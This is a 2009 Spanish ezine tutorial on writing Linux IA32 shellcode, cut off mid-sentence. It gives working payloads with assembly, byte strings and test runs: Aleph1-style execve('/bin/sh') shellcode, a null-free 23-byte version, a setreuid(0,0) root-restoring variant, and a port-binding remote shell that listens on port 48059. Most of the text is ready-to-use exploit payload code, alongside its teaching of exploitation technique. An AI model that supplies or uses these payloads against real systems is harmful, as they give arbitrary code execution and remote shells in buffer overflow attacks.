@@ -1,0 +1,967 @@
+-[ 0x08 ]--------------------------------------------------------------------
+-[ Programando Shellcodes IA32 ]---------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-37--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+1 - Introduccion
+
+2 - Llamadas de Sistema
+
+3 - Viaje al Pasado
+
+4 - Viaje al Presente
+
+5 - Conexion a Puertos
+
+6 - Conclusion
+
+
+---[ 1 - Introduccion
+
+Hola, soy Troy McClure. Me recordaran de otros documentales de naturaleza
+como Earwigs: Eww! y El hombre contra la naturaleza: El camino de la victoria.
+
+Ademas, es posible que me recuerden de otros textos como "Jugando con Frame
+Pointer" y "Format Strings (Paso a Paso)", amen de algunos otros.
+
+Bien, una vez he descargado un poco de adrenalina, me dispongo ahora a
+comentar de que va este articulo.
+
+Creo que es mas que evidente que en un e-zine dedicado a la explotacion de
+vulnerabilidades, el cual cuenta ademas entre sus articulos con un gran menu
+sobre overflows, seria una desconsideracion por mi parte no proporcionar una
+breve guia acerca de como programar tus propios Shellcodes, esos paquetes
+bomba que introduces normalmente en algun buffer con el objetivo de que sean
+el nucleo de una ejecucion de codigo arbitrario.
+
+Como dice el titulo, las Shellcodes seran desarrolladas para un sistema
+operativo Linux bajo un arquitectura de procesador x86. Esto deja las puertas
+abiertas a aquellos que se atrevan a presentar cualquier otra plataforma. 
+
+Por esta razon de base, espero que lo que viene a continuacion sea de alguna
+utilidad en tus desarrollos.
+
+
+
+---[ 2 - Llamadas de Sistema
+
+Un Shellcode no es mas que una cadena de codigos de operacion hexadecimales
+(opcodes en la jerga), extraidos a partir de instrucciones tipicas de lenguaje
+ensamblador.
+
+En realidad tu podrias codear cualquier programa en ensamblador, extraer sus
+opcodes, y convertirlo en una shellcode. Pero desgraciadamente existen dos
+limitaciones:
+
+   1) La longitud del buffer que permita almacenar ese shellcode.
+   2) Una cadena no puede contener bytes NULL como (0x00).
+
+La primera de las limitaciones a veces puede solventarse cuando la shellcode es
+almacenada en una variable de entorno y el registro EIP se redirecciona a este
+lugar.
+
+La segunda como es de suponer, radica en que un caracter '\0' en el Sistema
+Operativo Linux tiene el significado de "final de cadena", por lo que seria
+desechado lo que hubiera por delante de ese caracter.
+
+Si hay algo que tienen en comun todas las shellcodes, es que hacen uso de las
+llamadas al sistema o "syscall's", para lograr sus objetivos.
+
+Una syscall es el modo que tiene Linux de proporcionar comunicacion entre el
+nivel de usuario y el nivel de kernel. Por ejemplo, cuando queremos escribir
+algo en un archivo, y hacemos uso de "write()", el programa produce una
+interrupcion de modo que el control se pase al kernel, y sea este quien en
+definitiva escriba los datos en el disco.
+
+Aqui una lista de las llamadas de sistema normales:
+
+---
+ |   $ head -n 80 /usr/include/asm/unistd.h
+ |   #ifndef _ASM_I386_UNISTD_H_
+ |   #define _ASM_I386_UNISTD_H_
+ |
+ |   /*
+ |   * This file contains the system call numbers.
+ |   */
+ |
+ |   #define __NR_exit 1
+ |   #define __NR_fork 2
+ |   #define __NR_read 3
+ |   #define __NR_write 4
+ |   #define __NR_open 5
+ |   #define __NR_close 6
+ |   #define __NR_waitpid 7
+ |   #define __NR_creat 8
+ |   #define __NR_link 9
+ |   #define __NR_unlink 10
+ |   #define __NR_execve 11
+ |   #define __NR_chdir 12
+ |   #define __NR_time 13
+ |   #define __NR_mknod 14
+ |   #define __NR_chmod 15
+ |   #define __NR_lchown 16
+ |   #define __NR_break 17
+ |   #define __NR_oldstat 18
+ |   #define __NR_lseek 19
+ |   #define __NR_getpid 20
+ |   #define __NR_mount 21
+ |   #define __NR_umount 22
+ |   #define __NR_setuid 23
+ |   #define __NR_getuid 24
+ |   #define __NR_stime 25
+ |   #define __NR_ptrace 26
+ |   #define __NR_alarm 27
+ |   #define __NR_oldfstat 28
+ |   #define __NR_pause 29
+ |   #define __NR_utime 30
+ |   #define __NR_stty 31
+ |   #define __NR_gtty 32
+ |   #define __NR_access 33
+ |   #define __NR_nice 34
+ |   #define __NR_ftime 35
+ |   #define __NR_sync 36
+ |   #define __NR_kill 37
+ |   #define __NR_rename 38
+ |   #define __NR_mkdir 39
+ |   #define __NR_rmdir 40
+ |   #define __NR_dup 41
+ |   #define __NR_pipe 42
+ |   #define __NR_times 43
+ |   #define __NR_prof 44
+ |   #define __NR_brk 45
+ |   #define __NR_setgid 46
+ |   #define __NR_getgid 47
+ |   #define __NR_signal 48
+ |   #define __NR_geteuid 49
+ |   #define __NR_getegid 50
+ |   #define __NR_acct 51
+ |   #define __NR_umount2 52
+ |   #define __NR_lock 53
+ |   #define __NR_ioctl 54
+ |   #define __NR_fcntl 55
+ |   #define __NR_mpx 56
+ |   #define __NR_setpgid 57
+ |   #define __NR_ulimit 58
+ |   #define __NR_oldolduname 59
+ |   #define __NR_umask 60
+ |   #define __NR_chroot 61
+ |   #define __NR_ustat 62
+ |   #define __NR_dup2 63
+ |   #define __NR_getppid 64
+ |   #define __NR_getpgrp 65
+ |   #define __NR_setsid 66
+ |   #define __NR_sigaction 67
+ |   #define __NR_sgetmask 68
+ |   #define __NR_ssetmask 69
+ |   #define __NR_setreuid 70
+ |   #define __NR_setregid 71
+ |   .......
+ |   .......
+ |   #define __NR_socketcall 102
+ |   .......
+---
+
+Cuando pensamos en una shellcode clasica, podemos sacar 3 clasicas llamadas
+de sistema:
+
+   1 - setreuid(0,0);  -> #define __NR_setreuid 70
+
+   2 - excve("/bin/sh", args[], NULL); -> #define __NR_execve 11
+
+   3 - exit(0); -> #define __NR_exit 1
+
+Ejecutar una de estas syscall en ensamblador, es demasiado sencillo, tan solo
+hay que establecer los registros del procesador del modo adecuado siendo:
+
+   EAX -> El numero de la syscall correspondiente
+   EBX -o
+   ECX  |
+   EDX  |-> Los parametros asociados a la syscall.
+   ESI  |
+   EDI -o
+
+NOTA: Hay que darse cuenta que los numeros de las syscalls estan definidos en
+      formato decimal. En ensamblador acostumbraremos a pasarlos a hexadecimal.
+
+Con toda esta informacion, podemos poner el clasico ejemplo del programa que
+solo ejecuta una llamada a "exit(0)".
+
+[---]
+
+/* salir.c */
+
+#include <stdlib.h>
+
+void main() {
+   exit(0);
+} 
+
+[---]
+
+blackngel@mac:~$ gcc salir.c --static -o salir
+blackngel@mac:~$ gdb -q ./salir
+(gdb) disass _exit
+Dump of assembler code for function _exit:
+0x0804dfbc <_exit+0>:   mov    0x4(%esp),%ebx   ; argumento de exit()
+0x0804dfc0 <_exit+4>:   mov    $0xfc,%eax       ; syscall 252
+0x0804dfc5 <_exit+9>:   int    $0x80            ; exit_group()
+0x0804dfc7 <_exit+11>:  mov    $0x1,%eax        ; syscall "1"
+0x0804dfcc <_exit+16>:  int    $0x80            ; exit()
+0x0804dfce <_exit+18>:  hlt    
+End of assembler dump.
+(gdb) 
+
+Es decir, que muy facil, en realidad la llamada a exit_group() es un agregado
+de GCC, por lo demas a nosotros nos interesa solo exit().
+
+Nosotros mismos podemos escribir el mismo programa en ensamblador sin la
+necesidad de realizar la llamada a "exit_group()":
+
+[-----]
+
+section .text
+global _start
+
+_start:
+
+   xor eax, eax ; eax = 0 -> Limpieza
+   xor ebx, ebx ; ebx = 0 -> 1er Parametro
+   mov al, 0x01 ; eax = 1 -> #define __NR_exit 1
+   int 0x80     ; Ejecutar syscall
+
+[-----]
+
+Ahora podemos compilarlo y enlazarlo del siguiente modo:
+
+blackngel@mac:~$ nasm -f elf salida.asm
+blackngel@mac:~$ ld salida.o -o salida
+blackngel@mac:~$ ./salida
+blackngel@mac:~$
+
+Hasta este punto no sabemos si el programa se ha ejecutado correctamente,
+porque como se limita a "salir", no podemos ver nada. Aunque debemos tener
+en cuenta que NO obtener un fallo de segmentacion es algo significativo.
+
+Muchos ya conoceis el programa "strace()" que permite ver precisamente las
+llamadas al sistema que son ejecutadas durante el transcurso de una aplicacion.
+Nosotros vamos a convertir primero nuestro programa en una cadena shellcode
+tradicional, y luego veremos que ocurre.
+
+
+blackngel@mac:~$ objdump -d ./salida
+
+./salida:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       31 c0                   xor    %eax,%eax
+ 8048062:       31 db                   xor    %ebx,%ebx
+ 8048064:       b0 01                   mov    $0x1,%al
+ 8048066:       cd 80                   int    $0x80
+blackngel@mac:~$ 
+
+Es genial que se conserve todo tan limpio. El mismo programa en lenguaje C
+hubiera agregado varias secciones mas y ensuciado nuestro codigo. Cojamos
+nuestros opcodes:
+
+
+[-----]
+
+char shellcode[] = "\x31\xc0\x31\xdb\xb0\x01\xcd\x80";
+
+void main()
+{
+   void (*fp) (void);
+
+   fp = (void *)shellcode;
+
+   fp();
+}
+
+[-----]
+
+blackngel@mac:~$ gcc sc.c -o sc
+blackngel@mac:~$ ./sc
+blackngel@mac:~$ strace ./sc
+execve("./sc", ["./sc"], [/* 37 vars */]) = 0
+brk(0)                                  = 0x804a000
+[...................]
+[...................]
+[...................]
+_exit(0)                                = ?
+Process 13568 detached
+blackngel@mac:~$ 
+
+Genial, podemos ver como nuestra llamada _exit(0) es ejecutada correctamente.
+
+Hay algo interesante a observar antes de que continuemos. La forma que hemos
+probado para la ejecucion de la Shellcode, fue tan simple como declarar un
+puntero de funcion, y hacer que su direccion se corresponda con el inicio de
+la cadena shellcode[]. De este modo, cuando la funcion sea llamada, el codigo
+sera ejecutado correctamente.
+
+Recordando el articulo de Aleph1, muchos ya saben que otra de las formas mas
+clasicas de probar una shellcode era con el siguiente fragmento:
+
+[-----]
+
+char shellcode[] = "\x31\xc0\x31\xdb\xb0\x01\xcd\x80";
+
+void main() {
+   int *ret;
+
+   ret = (int *)&ret + 2;
+   (*ret) = (int)shellcode;
+}
+
+[-----]
+
+Esto es mucho mas confuso, en realidad se provoca una especie de desbordamiento
+de buffer. Es decir, al ser "*ret" la unica variable local declarada, se supone
+que justo detras de esta se encuentran EBP y EIP, lo que hace la operacion (+)
+es moverse dos posiciones en la memoria mas alla, de modo que luego "ret" se
+convierta en EIP, y se cambia su valor por el del inicio de "char shellcode[]".
+Cuando main() retorne, nuestro codigo sera ejecutado.
+
+He explicado esto debido a que esta segunda tecnica no es totalmente portable
+al menos para las pruebas. Por ejemplo ejecutando strace tras compilar con las
+versiones de gcc 4.1 y 3.3 se obtineen los siguientes resultados:
+
+blackngel@mac:~$ gcc sc.c -o sc
+blackngel@mac:~$ strace ./sc
+execve("./sc", ["./sc"], [/* 37 vars */]) = 0
+brk(0)                                  = 0x804a000
+[...................]
+[...................]
+[...................]
+exit_group(134518092)                   = ?
+Process 14806 detached
+
+blackngel@mac:~$ gcc-3.3 sc.c -o sc
+blackngel@mac:~$ strace ./sc
+execve("./sc", ["./sc"], [/* 37 vars */]) = 0
+brk(0)                                  = 0x804a000
+[...................]
+[...................]
+[...................]
+_exit(0)                                = ?
+Process 14813 detached
+blackngel@mac:~$
+
+Comprobamos que solo con GCC-3.3 nuestro programa se ejecuto del modo correcto.
+
+
+
+---[ 3 - Viaje al Pasado
+
+Vale, cierto, aprovechar un buffer overflow para finalmente solo ejecutar una
+llamada a exit(0) es bastante pobre. Es por ello que el objetivo principal de
+todo shellcode es ejecutar precisamente una "shell de comandos" (cuando no un
+comando invidiual).
+
+El nucleo de esta clase de shellcodes es una llamada a execve(), con el primer
+y segundo parametros establecidos a una cadena "/bin/sh". Segun Aleph1, era algo
+como lo siguiente:
+
+[-----]
+
+#include <stdio.h>
+
+void main() {
+   char *name[2];
+
+   name[0] = "/bin/sh";
+   name[1] = NULL;
+   execve(name[0], name, NULL);
+}
+
+[-----]
+
+El mayor problema a la hora de traducir este codigo a ensamblador, radica en
+como hacer referencia a la cadena "/bin/sh" cuando se desean establecer los
+parametros de la syscall.
+
+Y el truco que vino a solucionar definitivamente este problema fue mas que
+increiblemente ingenioso. Se basa en utilizar una estructura como la siguiente:
+
+    o---jmp offset_to_call
+    |   popl %esi <----------o
+    |   [codigo shell]       |
+    |   ..............       |
+    |   ..............       |
+    |   [codigo shell]       |
+    o-> call offset-to-popl -o
+        .string \"/bin/sh\"
+
+Todos los que conocen un poco de ensamblador, saben que lo primero que se hace
+cuando una instruccion CALL es ejecutada, es pushear el valor de EIP en la pila,
+valor que resulta ser exactamente la siguiente instruccion a ejecutar, en este
+caso "/bin/sh" (que no es una instruccion por supuesto).
+
+Sabiendo esto, el truco esta en colocar un salto (jmp) antes de la shellcode,
+para ir directamente a la instruccion CALL, que va seguida de la cadena que
+nos interesa, seguidamente, este CALL va encaminado a la siguiente instruccion
+despues del primer "jmp", cuyo objetivo es precisamente popear el valor recien
+pusheado por CALL, que es EIP, y se almacena en "%esi", a partir de ese momento
+el resto del codigo shell puede hacer referencia a la cadena "/bin/sh" haciendo
+uso solo del registro "%esi".
+
+Vamos a explicar un poco ahora lo que hace el shellcode de Aleph1:
+
+[-----]
+
+        jmp    0x26             ; Salto al Call
+        popl   %esi             ; Comienzo de:   "/bin/sh"
+        movl   %esi,0x8(%esi)   ; Concatenar :   "/bin/sh_/bin/sh"
+        movb   $0x0,0x7(%esi)	; '\0' al final: "/bin/sh\0/bin/sh"
+        movl   $0x0,0xc(%esi)   ; '\0' al final: "/bin/sh\0/bin/sh\0"
+        movl   $0xb,%eax        ; Syscall 11 -----------------------o
+        movl   %esi,%ebx        ; arg1 = "/bin/sh"                  |
+        leal   0x8(%esi),%ecx   ; arg2[2] = {"/bin/sh", "0"}        |
+        leal   0xc(%esi),%edx   ; arg3 = NULL                       |
+        int    $0x80            ; excve("/bin/sh", arg2[], NULL) <--o
+        movl   $0x1, %eax       ; Syscall 1 --o
+        movl   $0x0, %ebx       ; arg1 = 0    |
+	int    $0x80            ; exit(0) <---o
+        call   -0x2b            ; Salto al Jump
+        .string \"/bin/sh\"     ; Nuestra cadena
+
+[-----]
+
+Si lees detenidamente mis comentarios, veras que no es mas que un juego en el
+que se deben ir componiendo con precision las piezas.
+
+Podemos extraer los opcodes si primero introduces todo el codigo anterior en
+una llamada a: __asm__("");
+
+Obtendras algo como esto:
+
+char shellcode[] =
+        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
+
+Si bien podras ejecutar este codigo tanto con el metodo de Aleph1, como si
+decides declarar un puntero de funcion, esta shellcode tiene un problema a
+la hora de utilizarse en un caso real de buffer overflows. Y es precisamente
+la limitacion de la que hablamos al principio de este articulos sobre el
+contenido de bytes NULL.
+
+Al introducir esta Shellcode un buffer, seria interpretada como una cadena y
+se cortaria al llegar a este punto: "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00".
+Por lo tanto nuestro intento quedaria frustrado.
+
+Es por este motivo que se debe desarrollar un codigo todavia mas limpio que
+evite cualquier tipo de caracter no apto en nuestra cadena. Los consejos son
+utilizar instrucciones como "xor reg,reg" en vez de "movl 0,reg" y utilizar
+el temano de registro mas pequeno posible, por ejemplo "al" en vez de "ax".
+Siguiendo estas instrucciones, Aleph1 reconstruyo su shellcode de esta manera:
+
+[-----]
+
+        jmp    0x1f                     # 2 bytes
+        popl   %esi                     # 1 byte
+        movl   %esi,0x8(%esi)           # 3 bytes
+        xorl   %eax,%eax                # 2 bytes -> eax = 0
+        movb   %eax,0x7(%esi)           # 3 bytes
+        movl   %eax,0xc(%esi)           # 3 bytes
+        movb   $0xb,%al                 # 2 bytes -> al = 11 [excve()]
+        movl   %esi,%ebx                # 2 bytes
+        leal   0x8(%esi),%ecx           # 3 bytes
+        leal   0xc(%esi),%edx           # 3 bytes
+        int    $0x80                    # 2 bytes
+        xorl   %ebx,%ebx                # 2 bytes -> ebx = 0
+        movl   %ebx,%eax                # 2 bytes -> eax = ebx = 0
+        inc    %eax                     # 1 bytes -> eax += 1
+        int    $0x80                    # 2 bytes
+        call   -0x24                    # 5 bytes
+        .string \"/bin/sh\"             # 8 bytes
+
+[-----]
+
+Los opcodes resultantes son los siguientes:
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+Ademas, esto es estupendo para nuestros propositos, ya que logramos muchas
+mas ventajas:
+
+   1) Nos deshacemos de los caracteres NULL.
+   2) Minimizamos el tamano de la Shellcode.
+   3) Maximizamos el rendimiento de la Shellcode.
+
+Con respecto a la longitud de nuestro codigo shell, piensa que puede ser un
+factor francamente importante ante buffer's explotables que resulten ser
+demasiado pequenos. Piensa tambien que en los ejemplos que hemos mostrado,
+podrias suprimir sin miedo alguna el codigo correspondiente a la llamada
+exit(0).
+
+Este codigo es "prescindible":
+
+        movl   $0x1, %eax       ; Syscall 1 --o
+        movl   $0x0, %ebx       ; arg1 = 0    |
+	int    $0x80            ; exit(0) <---o
+
+Para terminar con el metodo antiguo, me gustaria mostrar el codigo utilizado
+en los libros: "The Shellcoders Handbook" y "Hacking: The Art of Explotation".
+
+La esencia es la misma, solo que se utiliza la sintaxis de NASM, los saltos se
+hacen a traves de etiquetas, y la cadena o string (db) nos ofrece una idea muy
+intuitiva del puzzle que esta a punto de ser montado.
+
+[-----]
+
+     global _start
+_start:
+     jmp short     GotoCall
+shellcode:
+     pop           esi
+     xor           eax, eax
+     mov  byte     [esi + 7], al
+     lea           ebx, [esi]
+     mov  long     [esi + 8], ebx
+     mov  long     [esi + 12], eax
+     mov  byte     al, 0x0b
+     mov           ebx, esi
+     lea           ecx, [esi + 8]
+     lea           edx, [esi + 12]
+     int           0x80
+GotoCall:
+     Call           shellcode
+     db            '/bin/shJAAAAKKKK'
+
+
+[-----]
+
+La prueba de todo:
+
+blackngel@mac:~$ objdump -d ./sc1
+
+./sc1:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	eb 1a                	jmp    804807c <GotoCall>
+
+08048062 <shellcode>:
+ 8048062:       5e                   	pop    %esi
+ 8048063:       31 c0                	xor    %eax,%eax
+ 8048065:       88 46 07             	mov    %al,0x7(%esi)
+ 8048068:       8d 1e                	lea    (%esi),%ebx
+ 804806a:       89 5e 08             	mov    %ebx,0x8(%esi)
+ 804806d:       89 46 0c             	mov    %eax,0xc(%esi)
+ 8048070:       b0 0b                	mov    $0xb,%al
+ 8048072:       89 f3                	mov    %esi,%ebx
+ 8048074:       8d 4e 08             	lea    0x8(%esi),%ecx
+ 8048077:       8d 56 0c             	lea    0xc(%esi),%edx
+ 804807a:       cd 80                	int    $0x80
+
+0804807c <GotoCall>:
+ 804807c:       e8 e1 ff ff ff       	call   8048062 <shellcode>
+ 8048081:       2f                   	das    
+ 8048082:       62 69 6e             	bound  %ebp,0x6e(%ecx)
+ 8048085:       2f                   	das    
+ 8048086:       73 68                	jae    80480f0 <GotoCall+0x74>
+ 8048088:       4a                   	dec    %edx
+ 8048089:       41                   	inc    %ecx
+ 804808a:       41                   	inc    %ecx
+ 804808b:       41                   	inc    %ecx
+ 804808c:       41                   	inc    %ecx
+ 804808d:       4b                   	dec    %ebx
+ 804808e:       4b                   	dec    %ebx
+ 804808f:       4b                   	dec    %ebx
+ 8048090:       4b                   	dec    %ebx
+
+blackngel@mac:~$ cat sc2.c
+
+char shellcode[] =
+        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
+        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
+        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41"
+        "\x4b\x4b\x4b\x4b";
+
+int main()
+{
+   int *ret;
+   ret = (int *)&ret + 2;
+   (*ret) = (int)shellcode;
+}
+
+blackngel@mac:~$ ./sc2
+sh-3.2$ exit
+exit
+blackngel@mac:~$ 
+
+Prueba tu mismo a borrar toda la cadena "\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b",
+y comprobaras como tu shellcode todavia sigue funcionando.
+
+Te gustaria continuar con el viaje?
+
+
+
+---[ 4 - Viaje al Presente
+
+El presente no tiene mucho misterio por el momento, la diferencia con respecto
+al metodo de Aleph1 se basa en que ya no es necesario el uso de los saltos (jmp
+y call) para referenciar la cadena "/bin/sh".
+
+Alguien muy astuto se dio cuenta de que podia obtener el mismo resultado
+haciendo un buen uso del stack. Ya que todos sabemos que %esp apunta siempre
+a la cima de la pila, podemos ir metiendo elementos en la pila e ir copiando
+la direccion de %esp a los registros que corresponden a cada parametro de la
+syscall.
+
+Para que quede mas claro, pongamos un ejemplo absurdo. Debes recordar que los
+valores en la pila se introducen en orden inverso. Si deseamos colocar en el
+registro %ebx la cadena "abc", podriamos decir que hacer lo siguiente es valido
+
+   push "\0"
+   push "C"
+   push "B"
+   push "A"
+   mov ebx, esp
+
+Y te preguntaras. Y entonces como colocamos la cadena "/bin/sh" en la pila?
+El truco esta en partir la cadena en dos subcadenas de tal modo que queden asi:
+
+   - "/bin"
+   - "//sh"
+
+Hay que tener en cuenta que esta construccion es valida:
+
+blackngel@mac:~$ /bin//sh
+sh-3.2$ exit
+exit
+blackngel@mac:~$ 
+
+Si transformamos sus valores en hexadecimal (hexdump), entonces ya podemos hacer
+algo como esto:
+
+   xor eax, eax          ; eax = 0
+   push eax              ; "\0"
+   push dword 0x68732f2f ; "//sh"
+   push dword 0x6e69622f ; "/bin"
+   mov ebx, esp          ; arg1 = "/bin//sh\0"
+
+Ya solo nos queda ver el codigo completo. Esta vez si que haremos uso de la
+llamada a "setreuid(0,0)" que reestablece los permisos de root si el programa
+los habia modificado anteriormente.
+
+[-----]
+
+section .text
+global _start
+
+_start:
+
+   xor eax, eax    ; Limpieza
+   mov al, 0x46    ; Syscall 70
+   xor ebx, ebx    ; arg1 = 0
+   xor ecx, ecx    ; arg2 = 0
+   int 0x80        ; setreuid(0,0)
+
+   xor eax, eax          ; eax = 0
+   push eax              ; "\0"
+   push dword 0x68732f2f ; "//sh"
+   push dword 0x6e69622f ; "/bin"
+   mov ebx, esp          ; arg1 = "/bin//sh\0"
+
+   push eax        ; NULL        -> args[1]
+   push ebx        ; "/bin/sh\0" -> args[0]
+   mov ecx, esp    ; arg2 = args[]
+   mov al, 0x0b    ; Syscall 11
+   int 0x80        ; excve("/bin/sh", args["/bin/sh", "NULL"], NULL);
+
+[-----]
+
+Nuevamente, la prueba del delito:
+
+blackngel@mac:~$ nasm -f elf sc3.asm
+blackngel@mac:~$ ld sc3.o -o sc3
+blackngel@mac:~$ objdump -d ./sc3
+
+./sc3:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       31 c0                	xor    %eax,%eax
+ 8048062:       b0 46                	mov    $0x46,%al
+ 8048064:       31 db                	xor    %ebx,%ebx
+ 8048066:       31 c9                	xor    %ecx,%ecx
+ 8048068:       cd 80                	int    $0x80
+ 804806a:       31 c0                	xor    %eax,%eax
+ 804806c:       50                   	push   %eax
+ 804806d:       68 2f 2f 73 68       	push   $0x68732f2f
+ 8048072:       68 2f 62 69 6e       	push   $0x6e69622f
+ 8048077:       89 e3                	mov    %esp,%ebx
+ 8048079:       50                   	push   %eax
+ 804807a:       53                   	push   %ebx
+ 804807b:       89 e1                	mov    %esp,%ecx
+ 804807d:       b0 0b                	mov    $0xb,%al
+ 804807f:       cd 80                	int    $0x80
+
+blackngel@mac:~$ ./sc3
+sh-3.2$ exit
+exit
+blackngel@mac:~$ 
+
+Parece bastante pequeña y eficiente. Imaginate entonces que eliminasemos la
+llamada a "setreuid(0,0)":
+
+ 8048060:       31 c0                	xor    %eax,%eax
+ 8048062:       50                   	push   %eax
+ 8048063:       68 2f 2f 73 68       	push   $0x68732f2f
+ 8048068:       68 2f 62 69 6e       	push   $0x6e69622f
+ 804806d:       89 e3                	mov    %esp,%ebx
+ 804806f:       50                   	push   %eax
+ 8048070:       53                   	push   %ebx
+ 8048071:       89 e1                	mov    %esp,%ecx
+ 8048073:       b0 0b                	mov    $0xb,%al
+ 8048075:       cd 80                	int    $0x80
+
+Un shellcode de tan solo 23 miserables bytes, lo suficientemente pequeno como
+para entrar en la mayoria de los bufer's que son declarados en las aplicaciones
+vulnerables (y no vulnerables).
+
+[-----]
+
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+                   "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+void main() {
+   void (*fp) (void);
+
+   fp = (void *)&shellcode;
+
+   fp();
+}
+
+[-----]
+
+blackngel@mac:~$ gcc sc.c -o sc
+blackngel@mac:~$ ./sc
+sh-3.2$ exit
+exit
+blackngel@mac:~$
+
+
+
+---[ 5 - Conexion a Puertos
+
+El codigo que aqui mostraremos esta extraido del famoso libro "Gray Hat Hacking"
+(Hacking Etico en espanol). Se expone aqui por dos motivos:
+
+   1) Su interes practico en la explotacion de overflows remotos.
+   2) El deseo de explicar detenidamente su estructura. 
+
+El siguiente codigo ensamblado, no es mas que un servidor base programado con
+sockets en C. Su objetivo es poner un puerto a la escucha (en este caso el
+48059) y esperar por una conexion entrante. La diferencia, es que cuando esta
+conexion es establecida, se utilizan tres llamadas a la funcion "dup2()" cuya
+mision es duplicar los tres descriptores principales del servidor en el cliente,
+estos son la entrada, la salida y la salida de errores estandar.
+
+De este modo, cualquier cosa que ejecute y/o imprima el servidor, podra ser
+visualizado en el cliente (esto se debe a dup2(socket, stdout);) y todo aquello
+que escriba el cliente, sera recibido por el servidor (dup2(socket, stdin);).
+
+Por lo demas, establecer un socket a la escucha siempre sigue el mismo camino:
+
+   1) socket() -> Crea un nuevo socket.
+   2) bind()   -> Pone un puerto a la escucha.
+   3) listen() -> Espera por conexiones entrantes.
+   4) accept() -> Establece una conexion.
+
+En un sistema operativo Linux, todas estas llamadas (ademas de "connect()" para
+los clientes) son implementadas en una unica Syscall. Su nombre es "socketcall",
+y como ya has podido ver en la lista expuesta al principio de este articulo, se
+define con el numero "102".
+
+La pregunta es entonces: Como decirle a socketcall la funcion que deseamos usar?
+
+Pues estableciendo el parametro EBX de esta llamada de sistema:
+
+   EAX -> 102
+
+        | (1) -> socket()
+        | (2) -> bind()
+   EBX -| (3) -> connect()
+        | (4) -> listen()
+        | (5) -> accept()
+
+   ECX -> args[]
+
+La llamada a dup2() seria asi:
+
+   EAX -> 63
+   EBX -> Descriptor o socket destino
+   ECX -> Descriptor a copiar
+
+Lo ultimo que hace la shellcode es la misma llamada a excve() que describimos
+en la seccion anterior.
+
+Veamos el codigo comentado:
+
+[-----]
+
+BITS 32
+section .text
+global _start
+
+_start:
+   xor eax,eax            ;
+   xor ebx,ebx            ; Limpieza
+   xor ecx,ecx            ;
+
+   push eax               ; arg3 = 0
+   push byte 0x1          ; arg2 = 1 = PF_INET
+   push byte 0x2          ; arg1 = 2 = SOCK_STREAM
+   mov ecx,esp            ; ecx = args[]
+   inc bl                 ; socketcall[1] = socket()
+   mov al,102             ; syscall socketcall
+   int 0x80               ; Boom!
+   mov esi,eax            ; Guarda socket "server" en ESI
+
+   push edx               ; serv_addr.sin_addr.s_addr = 0 -> Localhost
+   push long 0xBBBB02BB   ; serv_addr.sin_port   = htons(48059); 
+                          ; serv_addr.sin_family = AF_INET;
+                          ; PAD
+   mov ecx,esp            ; ecx = struct sockaddr
+   push byte 0x10         ; arg3 = strlen(struct sockaddr)
+   push ecx               ; arg2 = &(struct sockaddr *) &serv_addr
+   push esi               ; arg1 = server
+   mov ecx,esp            ; ecx = args[]
+   inc bl                 ; socketcall[2] = bind()
+   mov al,102             ; syscall socketcall
+   int 0x80               ; Boom!
+
+   push edx               ; arg2 = 0 -> Sin limite de conexiones entrantes
+   push esi               ; arg1 = server
+   mov ecx,esp            ; ecx = args[]
+   mov bl,0x4             ; socketcall[4] = listen()
+   mov al,102             ; syscall socketcall
+   int 0x80               ; Boom!
+
+   push edx               ; arg3 = 0 -|_ Desechamos info del cliente conectado
+   push edx               ; arg2 = 0 -|  -------------------------------------
+   push esi               ; arg1 = server
+   mov ecx,esp            ; ecx = args[]
+   inc bl                 ; socketcall[5] = accept()
+   mov al,102             ; syscall socketcall
+   int 0x80               ; Boom!
+   mov ebx,eax            ; ebx = client -> Descriptor o socket destino
+
+   xor ecx,ecx            ;
+   mov al,63              ; dup2(client, stdin) -> Redirigir entrada al cliente 
+   int 0x80               ;
+
+   inc ecx                ;
+   mov al,63              ; dup2(client, stdout) -> Redirigir salida al cliente 
+   int 0x80               ;
+
+   inc ecx                ;
+   mov al,63              ; dup2(client, stderr) -> Redirigir errores al cliente 
+   int 0x80               ;
+
+   push edx               ;
+   push dword 0x68732f2f  ;
+   push dword 0x6e69622f  ;
+   mov ebx,esp            ;
+   push edx               ; Aqui el clasico execve("/bin/sh", args[], NULL);
+   push ebx               ;
+   mov ecx,esp            ;
+   mov al,0x0b            ;
+   int 0x80               ;
+
+[-----]
+
+En una consola compilamos, enlazamos y probamos el programa:
+
+[CONSOLA 1]
+
+blackngel@mac:~$ nasm -f elf binp.asm
+blackngel@mac:~$ ld binp.o -o binp
+blackngel@mac:~$ sudo ./binp
+[sudo] password for blackngel:
+
+Este se quedara en un estado suspendido a la espera de conexiones. En otra
